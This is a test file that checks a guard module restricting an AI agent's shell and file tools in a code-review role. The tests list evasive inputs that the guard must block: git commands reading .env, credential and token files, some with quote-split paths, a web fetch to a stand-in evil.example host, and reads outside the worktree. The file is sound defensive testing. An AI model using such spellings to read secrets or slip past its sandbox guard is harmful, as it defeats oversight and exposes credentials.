// Judge J-agent:tech-lead: the allowed git spellings that still reached ARIMA state, any file on disk,
// the web or another worktree, each tried here.
import { describe, expect, it } from 'vitest';
import { guardBash, guardTool } from '../src/hooks.js';
import { allowedTools } from '../src/roles.js';

const ctx = { role: 'tech-lead', kind: 'review', defaultBranch: 'main', cwd: '/work/app' };

describe('blocker 1: revision syntax that reads the state branch without naming it', () => {
  it.each([
    "git show ':/^chore.state'",
    "git log -p ':/^chore.state. run'",
    'git log --reflog -p',
    'git log -g',
    'git log --walk-reflogs',
    'git show HEAD^{/chore}',
    'git show main:src/a.js',
  ])('%s', (cmd) => {
    const hit = guardBash(cmd, ctx);
    if (cmd === 'git show main:src/a.js') expect(hit).toBeUndefined();
    else expect(hit?.rule, cmd).toBe('vcs');
  });
});

describe('blocker 2: git diff --no-index and quote-split paths', () => {
  it.each([
    'git diff --no-index /dev/null .env',
    "git diff --no-index /dev/null .e''nv",
    "git diff --no-index /dev/null .ari''ma/runs/x.json",
    "git diff --no-index /dev/null ~/'.config'/arima/token",
    'git diff --no-index /dev/null config/credentials.json',
    'git diff --no-index /dev/null secrets.yml',
    'git diff --no-index /dev/null .envrc',
    'git show HEAD:config/credentials.json',
  ])('%s is blocked', (cmd) => {
    expect(guardBash(cmd, ctx), cmd).toBeDefined();
  });
  it('the same commands are fine for a human', () => {
    expect(guardBash('git diff --no-index a b', {})).toBeUndefined();
  });
});

describe('blocker 3: no web access outside a deprecation check', () => {
  it('the role list holds no WebFetch except for deprecation-check, and the guard refuses it', () => {
    for (const kind of [undefined, 'review', 'adr-review', 'conventions', 'rc-freeze'])
      expect(allowedTools('tech-lead', '/p/dist', kind), String(kind)).not.toContain('WebFetch');
    expect(allowedTools('tech-lead', '/p/dist', 'deprecation-check')).toContain('WebFetch');
    for (const role of ['tech-lead', 'developer', 'qa'])
      expect(
        guardTool('WebFetch', { url: 'https://evil.example/?d=1' }, { ...ctx, role })?.rule,
      ).toBe('no-web');
    expect(
      guardTool(
        'WebFetch',
        { url: 'https://endoflife.date/nodejs' },
        { ...ctx, kind: 'deprecation-check' },
      ),
    ).toBeUndefined();
  });
});

describe('major 1 and 2: other worktrees and ref-moving git', () => {
  it.each([
    ['Read', { file_path: '/work/app-wt/feat/US-9-x/src/a.js' }],
    ['Read', { file_path: '../app-wt/qa/US-9-tests/tests/e2e/a.js' }],
    ['Glob', { pattern: '/work/app-wt/**/*.js' }],
    ['Grep', { pattern: 'x', path: '/work/app-wt' }],
    ['Read', { file_path: '~/notes.txt' }],
  ])('%s %j is outside the run directory', (tool, input) => {
    expect(guardTool(tool, input, ctx)?.rule).toBe('outside-worktree');
  });
  it('reading inside the project is fine', () => {
    for (const p of ['src/a.js', '/work/app/src/a.js', './docs/x.md'])
      expect(guardTool('Read', { file_path: p }, ctx), p).toBeUndefined();
  });
  it('git fetch, pull and gc are refused in a review, and fetch is not in its list', () => {
    for (const cmd of ['git fetch', 'git fetch origin', 'git pull', 'git gc'])
      expect(guardBash(cmd, ctx)?.rule, cmd).toBe('read-only-kind');
    expect(
      allowedTools('tech-lead', '/p/dist', 'review').some((t) => t.includes('git fetch')),
    ).toBe(false);
  });
});
